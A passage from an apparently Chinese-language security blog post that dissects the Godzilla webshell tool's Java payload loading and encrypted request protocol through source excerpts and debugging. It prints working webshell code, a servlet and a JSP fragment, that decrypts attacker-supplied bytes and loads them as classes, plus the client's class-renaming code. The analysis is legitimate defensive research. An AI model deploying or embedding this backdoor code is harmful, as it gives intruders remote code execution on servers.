punctuation">(</span>urlClassLoader<span class="token punctuation">,</span> classBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//用于第一次接受请求初始化payload</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                Object f = payload.newInstance(); </span>                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//本地加载payload，用于动态调试</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在哥斯拉主界面，点击测试会在burp发送两次请求，然后哥斯拉会弹框出现Success，这时候再点击确定，哥斯拉会发起第三次请求，先分析这三次请求的数据包以及哥斯拉都做了什么事情。<br><img src="/2022/05/17/godzilla/1.png"></p><h3 id="第一次请求"><a href="#第一次请求" class="headerlink" title="第一次请求"></a>第一次请求</h3><p>根据上面<code>HelloServlet.java</code>源代码，可以看到哥斯拉在传输过程中使用了AES加解密，在服务端先base64解码，然后AES解密数据包：<br><img src="/2022/05/17/godzilla/2.png"><br>把burp的数据包复制之后，本地解密看看是什么内容：<br><img src="/2022/05/17/godzilla/3.png"><br>可以从图里看出来大概是个Class文件，保存到本地之后，反编译可以之后会发现这个代码和<code>payload.java</code>除了类名不同，功能代码上完全一样。哥斯拉实现的这部分代码在<code>JavaShell.class</code>里面：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token class-name">String</span> <span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classNames <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>classNames<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">final</span> <span class="token keyword">int</span> index <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">randomInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> classNames<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            className <span class="token operator">=</span> classNames<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> className<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">dynamicUpdateClassName</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> protoName<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classContent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>classContent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"%s ----->>>>> %s"</span><span class="token punctuation">,</span> protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        classContent <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> protoName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要功能是动态改变<code>payload.class</code>的类名，会从<code>classNames.txt</code>里面随机选取一个名字：<br><img src="/2022/05/17/godzilla/4.png"><br>这是第一个请求的发送流程，做了两件事：</p><ol><li>把哥斯拉里面的<code>payload.class</code>更新为随机的类名，然后AES加密再经过base64发送到服务端的shell</li><li>服务端的shell解码解密之后，调用<code>defineClass</code>加载到JVM，初始化payload变量</li></ol><p><img src="/2022/05/17/godzilla/5.png"></p><p>关于<code>defineClass</code>的用法，可以看官方的代码注释，负责把byte[]转换为Class：</p><blockquote><p>However, some classes may not originate from a file; they may originate from other sources, such as the network, or they could be constructed by an application. The method {@link #defineClass(String, byte&gt;[], int, int) defineClass} converts an array of bytes into an instance of class Class. Instances of this newly defined class can be created using {@link Class#newInstance Class.newInstance}.</p></blockquote><h3 id="第二次请求"><a href="#第二次请求" class="headerlink" title="第二次请求"></a>第二次请求</h3><p>第二次请求，按照同样的方式解密数据包，会发现出来的是一堆乱码：<br><img src="/2022/05/17/godzilla/6.png"><br>不要慌，先保存到本地，然后重命名为gz文件，再使用gunzip解压之后查看文件，文件内容是<code>methodNametest</code><br>在哥斯拉源代码里面，可以扣出来相关实现:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReqParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token class-name">String</span> codeString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>codeString<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>isAlive <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>codeString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fillParameter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>className <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"evalClassName"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"methodName"</span><span class="token punctuation">,</span> funcName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fillParameter</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> funcName<span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//组装参数methodNametest</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> parameter<span class="token punctuation">.</span><span class="token function">formatEx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">gzipE</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//gzip压缩加密</span>    <span class="token keyword">return</span> functions<span class="token punctuation">.</span><span class="token function">gzipD</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">sendHttpResponse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//发送请求之后接收数据，然后解密解压缩</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>哥斯拉客户端的流程：先在本地组装本次请求的参数，压缩之后加密发送到服务端。</p><p>此时在打个断点做一次调试看看：<br><img src="/2022/05/17/godzilla/8.png"></p><h4 id="f-equals-arrOut"><a href="#f-equals-arrOut" class="headerlink" title="f.equals(arrOut)"></a><code>f.equals(arrOut)</code></h4><p>第一次进入到payload的equals函数，arrOut是<code>ByteArrayOutputStream</code>变量，传递给<code>this.outputStream</code>，初始化一个输出对象，用于获取payload执行结果，最终返回给客户端。<br><img src="/2022/05/17/godzilla/10.png"></p><h4 id="f-equals-data"><a href="#f-equals-data" class="headerlink" title="f.equals(data)"></a><code>f.equals(data)</code></h4><p>data是哥斯拉客户端传递给服务端的数据，服务端先进行解密，然后进入<code>f.equals(data)</code>函数，然后进入<code>handle()</code>函数进行变量初始化操作：<br><img src="/2022/05/17/godzilla/11.png"><br>上述操作完成之后，进入<code>this.formatParameter()</code>函数，对上一步获取到的<code>this.requestData</code>解压缩之后循环判断哥斯拉传递过来的数据，最后放到<code>this.paramterMap</code>:<br><img src="/2022/05/17/godzilla/12.png"></p><p>第二次的<code>equals</code>完成了对哥斯拉传递过来数据的初始化，最终放到<code>this.paramterMap</code>保存。</p><h4 id="f-equals-req"><a href="#f-equals-req" class="headerlink" title="f.equals(req)"></a><code>f.equals(req)</code></h4><p><img src="/2022/05/17/godzilla/9.png"><br>第三次equals的时候执行<code>f.equals(req)</code>，进入到<code>handle()</code>函数，填充<code>this.servletRequest</code>对象：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.http.HttpServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.ServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进入<code>this.handlePayloadContext()</code>利用<code>payload.class</code>里面定义好的反射函数，获取<code>servletRequest</code>, <code>servletContext</code>, <code>httpSession</code>对象，然后填充给payload变量：<br><code>this.servletRequest</code>、<code>this.servletContext</code>、<code>this.httpSession</code>。</p><p>继续跟进判断<code>this.servletRequest</code>不为空的时候，尝试获取<code>servletRequest</code>里面的<code>parameters</code>对象，经过判断之后赋给<code>this.requestData</code>。<br><img src="/2022/05/17/godzilla/13.png"></p><p>这里之所以又填充一次<code>this.requestData</code>变量，是为了兼容性考虑，比如在Spring里面直接写servlet，经过第二次的<code>equals()</code>就填充了<code>this.requestData</code>对象，但是在JSP里面，是利用<br><code>request.setAttribute(&quot;parameters&quot;, data);</code>来走到上面这一步填充<code>this.requestData</code>对象，这也是哥斯拉对servlet没有依赖的主要原因。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">  <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                Object f = payload.newInstance();</span>                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在JSP里面解析<code>pageContext</code>对象:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">X</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Q</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"parameters"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        